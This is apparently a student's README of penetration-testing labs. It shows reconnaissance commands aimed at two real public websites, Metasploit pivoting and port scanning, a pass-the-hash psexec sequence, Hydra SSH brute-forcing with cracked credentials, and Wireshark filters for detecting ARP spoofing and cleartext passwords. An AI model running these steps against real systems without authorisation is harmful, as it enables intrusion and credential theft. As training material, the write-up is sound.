# Applied Penetration Testing Labs

## 📌 Project Overview
This repository contains a comprehensive collection of hands-on cybersecurity lab exercises focused on **Web Application Reconnaissance**, **Network Discovery**, and **Penetration Testing Techniques**. The primary objective is to demonstrate practical knowledge of information gathering, vulnerability assessment, network pivoting, and traffic analysis using industry-standard security tools in a controlled environment.

---

## 🛠️ Tools & Technologies Used
* **Operating System:** Kali Linux
* **Reconnaissance & OSINT:** `whois`, `dig`, `nslookup`, `whatweb`, `theHarvester`
* **WAF Fingerprinting:** `wafw00f`
* **Network Scanning & Pivoting:** `Nmap`, `Metasploit Framework (MSF6)`
* **Brute-Forcing & Cracking:** `Hydra`, `John the Ripper`
* **Network Analysis:** `Wireshark` (Traffic Inspection & Packet Analysis)

---

## 🚀 Lab Exercises & Core Commands

### 1. Web Application Reconnaissance
Conducted passive and active reconnaissance against target domains (`vocabulary.com` and `crazygames.com`) to extract infrastructure details.

* **Domain WHOIS Lookup:**
    ```bash
    whois vocabulary.com
    ```
    * **Key Findings:** Registered via 101domain GRS Limited, utilizing Cloudflare Name Servers (`CHUCK.NS.CLOUDFLARE.COM`).
* **DNS Enumeration (`dig` & `nslookup`):**
    ```bash
    dig vocabulary.com
    nslookup debug vocabulary.com
    ```
    * **Key Findings:** Identified target IPv4 addresses (`104.18.40.231`, `172.64.147.25`) and IPv6 addresses with a TTL of 5.
* **Web Technology Fingerprinting:**
    ```bash
    whatweb vocabulary.com
    ```
    * **Key Findings:** Detected Cloudflare HTTPServer, Google Analytics (UA-154986-6), Strict-Transport-Security (HSTS), and cookie tracking mechanisms.
* **Automated OSINT Subdomain Harvesting:**
    ```bash
    theHarvester -d crazygames.com -l 500 -b duckduckgo
    ```
    * **Key Findings:** Discovered 32 subdomains (e.g., `developer.crazygames.com`, `auth.crazygames.com`) and captured an organizational email address: `general@crazygames.com`.

---

### 2. Firewall & Infrastructure Fingerprinting
Analyzed front-facing security controls and load balancers guarding target systems.

* **WAF Detection:**
    ```bash
    wafw00f [https://vocabulary.com](https://vocabulary.com)
    ```
    * **Result:** Confirmed the target domain is protected behind an **AWS Elastic Load Balancer (Amazon) WAF**.
* **HTTP Header Inspection:**
    ```bash
    curl -I vocabulary.com
    ```
    * **Result:** Observed `HTTP/1.1 301 Moved Permanently` redirecting to HTTPS, accompanied by Cloudflare-specific security cookies (`cf_bm`).

---

### 3. Network Discovery & Pivoting (Post-Exploitation)
Simulated a post-exploitation scenario moving from an initially compromised host into an isolated internal subnet.

* **Attacker Interface Validation:** Checked local IP constraints via `ifconfig` (Interface `eth0`: `192.168.92.130/24`).
* **Subnet Discovery:** Inside a functional Meterpreter context, executed network mapping:
    ```bash
    meterpreter > ipconfig
    meterpreter > arp
    ```
    * **Result:** Isolated an internal database target hidden at `103.122.138.130` within the `103.122.138.0/24` subnet layer.
* **Metasploit Pivoting & TCP Port Scan:**
    ```msf
    msf6 > route add 103.122.138.0 255.255.255.0 1
    msf6 > use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(tcp) > set RHOSTS 103.122.138.130
    msf6 auxiliary(tcp) > set PORTS 1-1024
    msf6 auxiliary(tcp) > set THREADS 10
    msf6 auxiliary(tcp) > run
    ```

---

### 4. Authentication Attacks & Privilege Escalation

* **Hash Identification:** Evaluated an administrative credential backup containing a `$1$` prefix, confirming the usage of the legacy **MD5-crypt (md5crypt)** derivation algorithm.
* **Credential Crack Checking:**
    ```bash
    john --show hashes.txt
    ```
* **Pass-the-Hash (PtH) Lateral Movement:** Leveraging NTLM hashes to launch an operational shell over SMB without plaintext password conversion:
    ```msf
    msf6 > use exploit/windows/smb/psexec
    msf6 exploit(psexec) > set RHOSTS 103.122.138.130
    msf6 exploit(psexec) > set SMBUser admin_backup
    msf6 exploit(psexec) > set SMBPass 00000000000000000000000000000000:aad3b435b51404eeaad3b435b51404ee
    msf6 exploit(psexec) > run
    ```
* **Rate-Limited SSH Brute-Forcing:**
    ```bash
    hydra -L user.txt -P pass.txt -t 4 ssh://192.168.129.129
    ```
    * **Result:** Successfully recovered valid operational credentials -> `marlinspike:marlinspike`.

---

### 5. Network Traffic Analysis & MitM Signatures
Utilized Wireshark to investigate unencrypted protocols and detect malicious localized network behaviors.

* **ARP Spoofing / Man-in-the-Middle Detection:**
    To intercept stateless ARP traffic (Gratuitous ARP attacks mapping hardware MAC addresses to default gateways), the following Wireshark filter was deployed to flag duplicate announcements:
    ```text
    arp.duplicate-address-detected || arp.isgratuitous
    ```
* **Isolating Cleartext HTTP Credentials:**
    ```text
    http.request.method == "POST" && http contains "password"
    ```
* **HTTP Basic Authentication Decoding:**
    Isolated HTTP basic auth streams via the `http.authbasic` filter and decoded the Base64 strings:
    ```bash
    echo "dXNlcjpwYXNzd29yZA==" | base64 --decode
    ```
* **FTP Stream Reconstruction:** Applied the `ftp` display filter and utilized Wireshark's **Follow TCP Stream** feature to aggregate interactive sessions, immediately exposing plaintext credentials passed via `USER` and `PASS` commands.

---

## 🧑‍💻 Author
* **Zeeshan** - Computer Science and Engineering Student & Applied Penetration Testing Trainee.
